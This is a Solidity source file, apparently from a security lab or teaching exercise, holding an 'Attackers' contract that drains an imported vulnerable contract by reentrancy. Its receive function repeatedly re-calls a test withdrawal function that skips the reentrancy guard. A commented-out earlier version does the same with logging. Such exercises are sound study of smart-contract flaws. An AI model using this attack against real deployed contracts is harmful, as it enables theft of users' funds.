// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./vulnerable_contract.sol";
import "forge-std/console.sol";  // Make sure to use forge-std for logging

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function withdrawTest(uint256 amount) external;
}

contract Attackers {
     IVulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = IVulnerableContract(_vulnerableContract);
    }

    // Initiates the attack by depositing ether and triggering the withdrawal
    function attack() external payable {
        // Deposit ether into the vulnerable contract
        vulnerableContract.deposit{value: msg.value}();

        // Trigger the withdrawal (start reentrancy)
        vulnerableContract.withdrawTest(msg.value); // Use withdrawTest to bypass reentrancy guard for testing
    }

    // Fallback function to allow reentrancy attack
    receive() external payable {
        uint256 vulnerableContractBalance = address(vulnerableContract).balance;

        // Ensure there is enough ether in the contract to keep withdrawing
        if (vulnerableContractBalance >= msg.value) {
            // Re-enter the vulnerable contract and trigger another withdrawal
            vulnerableContract.withdrawTest(msg.value); // Again bypass the reentrancy guard during the attack
        }
    }
}
//  VulnerableContract public vulnerable;
//     uint256 public reentrancyCount;

//     event Received(address sender, uint256 amount);
//     event ReentrancyAttempt(uint256 count);

//     constructor(address _vulnerableAddress) {
//         vulnerable = VulnerableContract(_vulnerableAddress);
//     }

//     // Attack function to start the reentrancy attack
//     function attack() external payable {
//         require(msg.value > 0, "Attack requires ether");

//         // Deposit ether into the vulnerable contract
//         console.log("Depositing %s ether into the vulnerable contract", msg.value);
//         vulnerable.deposit{value: msg.value}();

//         // Start the attack by calling withdraw
//         console.log("Initiating withdrawal from the vulnerable contract");
//         vulnerable.withdraw(msg.value);
//     }

//     // Fallback function called when reentrancy is triggered
//     fallback() external payable {
//         console.log("Fallback called. Reentrancy count: ", reentrancyCount);

//         // Log the current balance of the attacker and the vulnerable contract
//         console.log("Attacker's current balance: %s ether", address(this).balance);
//         console.log("Vulnerable contract's balance: %s ether", address(vulnerable).balance);

//         // Ensure we don't get stuck in an infinite loop (limit to 10 attempts)
//         if (reentrancyCount < 10 && address(vulnerable).balance > 0) {
//             reentrancyCount++;
//             console.log("Reentrancy attempt: %s", reentrancyCount);

//             // Call withdraw again to trigger another reentrancy
//             vulnerable.withdraw(1 ether); // Adjust amount if needed
//         } else {
//             console.log("Max reentrancy attempts reached or contract is empty. Ending attack.");
//         }
//     }

//     // Receive function to log ether receipt
//     receive() external payable {
//         emit Received(msg.sender, msg.value);
//         console.log("Received %s ether from %s", msg.value, msg.sender);
//     }